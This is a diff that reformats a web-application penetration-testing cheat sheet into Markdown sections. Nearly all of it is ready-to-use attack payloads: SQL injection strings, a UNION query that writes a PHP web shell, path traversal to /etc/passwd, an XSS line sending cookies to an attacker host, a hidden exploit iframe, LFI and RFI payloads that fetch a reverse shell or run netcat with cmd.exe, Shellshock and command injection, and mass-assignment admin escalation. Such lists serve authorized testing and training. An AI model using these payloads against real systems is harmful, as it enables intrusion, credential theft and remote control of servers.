@@ -1,4 +1,22 @@
-INFORMATION GATHERING
+# Web Applications
+
+- [Information Gathering](#information-gathering)
+- [Testing](#testing)
+- [Authorization](#authorization)
+- [Path Traversal](#path-traversal)
+- [SQL Enumerate](#sql-enumerate)
+- [SQL Blind](#sql-blind)
+- [SQL Web Shell](#sql-web-shell)
+- [IFRAME](#iframe)
+- [XSS](#xss)
+- [Code Injection](#code-injection)
+- [LFI](#lfi)
+- [RFI](#rfi)
+- [Command Injection](#command-injection)
+
+
+## Information Gathering
+
 Fingerprint Server HEAD request, httprint
 Review Metadata Robots.txt, curl -O http://$ip/robots.txt
 Enumerate Applications Spider, Dirb
@@ -9,7 +27,8 @@ Identify App Framework curl for X-Powered-By, look in comments, sourcecode, (php
 Fingerprint WebApp whatweb
 Map WebApp architecture proxies, databases,
 
-TESTING
+## Testing
+
 Known Server Vulnerabilities, Administrative Interfaces
 Configurations, logs viewable? php.ini, apache, .asa, .inc,
 Check for sensitive info backups, usernames, passwords, tokens, keys,
@@ -26,7 +45,8 @@ Credentials over HTTP
 Default credentials admin accounts, new accounts
 Auth Bypass Forced browsing, parameter modification, session ID prediction, SQL injection
 
-AUTHORIZATION
+## Authorization
+
 Path traversal/file includes request parameters used for file operations
   Unusual extensions, interesting parameter names, parameters in cookies
   Test internal files, local files, remote files
@@ -38,13 +58,15 @@ Direct object reference find where user input is used to reference objects direc
      Capture post data with Burp
      Sqlmap –u $site/php --method post --data=”username=asdfasdf" --not-string="Username or Password is invalid”
 
-Path Traversal
+## Path Traversal
+
 dotdotpwn
 dotslash                                    ../../../etc/passwd
 starting path                           /var/www/files/../../../etc/password
 file extension                         ../../../etc/passwd.png%2500
 
-SQL Enumerate
+## SQL Enumerate
+
 ‘ OR 1=1 --
 One record allowed             ‘ OR 1=1 LIMIT 1 --
 If ticks are filtered                  \ (in username) or 1=1# (in password) username=’ \’ and password = ‘ or 1=1#
@@ -74,18 +96,18 @@ lang=' UNION ALL SELECT 1,2,name,4,password,6 FROM users;#
      SELECT table_name FROM all_tables
      SELECT column_name FROM all_tab_columns
 
-SQL Blind
+## SQL Blind
      comment.php?id=738-sleep(5)
      comment.php?id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/hosts"),6
      comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE      'c:/xampp/htdocs/backdoor.php'
 
-SQL Web Shell
+## SQL Web Shell
      ' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php';#
 
-IFRAME
+## IFRAME
      <iframe SRC="hxxp://$ip:81/exploit" height = "0" width = "0"></iframe>
 
-XSS
+## XSS
 <script>new Image().src="hxxp://$ip:443/bogus.php?output="+document.cookie;</script>
 sCript
 <scr<script>ipt>
@@ -95,12 +117,12 @@ dude"; alert('Boo!');//
 example8.php/%20%20method="POST">%20%20%20%20%20%20<scRipt>confirm('Boo!');</sCript>%20///
 example9.php#<script>alert('Boo!'); </script> ////
 
-Code Injection
+## Code Injection
 System %22.system(%27hostname%27)%3B%23 “.system (‘hostname’);#
 complete code order=id)%3B}system(%27cat%20/etc/passwd%27)%3B%23 id);} system (‘cat /etc/passwd’);#
 add on ‘ .system(‘uname –a’).’
 
-LFI
+## LFI
      LFI If a phpinfo() file is present, it’s usually possible to get a shell
 
 Just webroot? --> config files
@@ -117,12 +139,12 @@ hxxp://192.168.183.128/fileincl/example1.php?page=php://input
 <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
 hxxp://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 
-RFI
+## RFI
      %3F&cmd=C:\nc.exe%2010%2E11%2E0%2E30%20443%20%2De%20cmd%2Eexe
      &LANG=../../../../../../../xampp/apache/logs/access.log%00
      <?php echo shell_exec('ipconfig')'; ?>
 
-Command Injection
+## Command Injection
 Commix
 if fail, execute X || cat /etc/passwd
 add a new line %0acat /etc/passwd
@@ -136,15 +158,15 @@ curl -A " () { 42;};echo; nslookup $site " $url
 
 First try netcat backdoor, if no then try php web shell
 
-Authorization
+### Authorization
      Navigate to pages without authorization
      Navigate to other users pages after authentication
      Navigate to other users links (can't view but can edit)
 
-Mass Assignment
+### Mass Assignment
   Add parameter &user%5Badmin%5D=1 ‘user [admin] = 1’
   Update value update_profile?user[username]=test&user[admin]=1
   Add value update_profile?user[company_id]=2
 
-Third Party
+### Third Party
      Yasuo
